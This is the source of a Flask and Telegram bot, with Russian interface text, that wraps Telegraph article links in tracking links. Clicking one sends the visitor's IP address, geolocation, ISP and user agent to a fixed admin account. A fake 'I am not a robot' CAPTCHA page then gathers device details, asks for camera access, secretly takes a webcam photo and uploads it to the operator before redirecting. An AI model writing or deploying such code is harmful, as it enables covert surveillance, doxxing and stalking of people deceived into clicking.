import telebot
import requests
import os
from flask import Flask, request, jsonify

API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/')
def index():
    return '<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;"><a href="/setup-my-bot-secret" style="color:#0088cc;text-decoration:none;font-family:sans-serif;font-weight:bold;border:2px solid #0088cc;padding:10px 20px;border-radius:10px;">ACTIVATE BOT</a></body>'

@app.route('/setup-my-bot-secret')
def setup_webhook():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "OK"
    return "ERROR"

@app.route('/v/<path:article_id>')
def logger(article_id):
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    ua = request.headers.get('user-agent')
    
    geo = "📍 No Geo"
    try:
        r = requests.get(f"http://ip-api.com{ip}?lang=ru", timeout=5).json()
        if r.get('status') == 'success':
            geo = f"🌍 {r.get('country')}, {r.get('city')}\n📡 {r.get('isp')}"
    except: pass

    bot.send_message(ADMIN_ID, f"🎯 *КЛИК!*\n\n👤 *IP:* `{ip}`\n{geo}\n📱 *UA:* `{ua}`", parse_mode="Markdown")
    
    return f'''
    <html>
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head>
    <body style="background:#121212;color:white;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div id="box">
            <div style="font-size:50px;margin-bottom:20px;">🤖</div>
            <p style="margin-bottom:20px;padding:0 20px;">Для перехода к статье подтвердите, что вы не робот</p>
            <button id="btn" style="padding:15px 40px;border:none;border-radius:30px;background:#0088cc;color:white;font-weight:bold;font-size:16px;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('btn');
        btn.onclick = async () => {{
            btn.innerText = "Проверка...";
            let info = {{
                plt: navigator.platform, ram: navigator.deviceMemory || "N/A",
                scr: window.screen.width + "x" + window.screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone, bat: "N/A"
            }};
            try {{
                let b = await navigator.getBattery();
                info.bat = Math.round(b.level * 100) + "%";
            }} catch(e) {{}}
            
            await fetch('/log_extra', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(info)
            }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg');
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "https://telegra.ph{article_id}";
                        }});
                    }}, 'image/jpeg');
                }}, 800);
            }} catch(e) {{
                window.location.href = "https://telegra.ph{article_id}";
            }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    msg = f"🖥 *ЖЕЛЕЗО*\n\n🔋 Заряд: `{d.get('bat')}`\n💾 ОЗУ: `{d.get('ram')} GB`\n📺 Экран: `{d.get('scr')}`\n🕒 Пояс: `{d.get('tz')}`"
    bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    file = request.files.get('photo')
    if file: bot.send_photo(ADMIN_ID, file.read(), caption="📸 Снимок с камеры!")
    return "ok"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_message():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Пришли ссылку на Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1].strip()
    bot.send_message(message.chat.id, f"✅ Ссылка:\n`https://{request.host}/v/{path}`", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
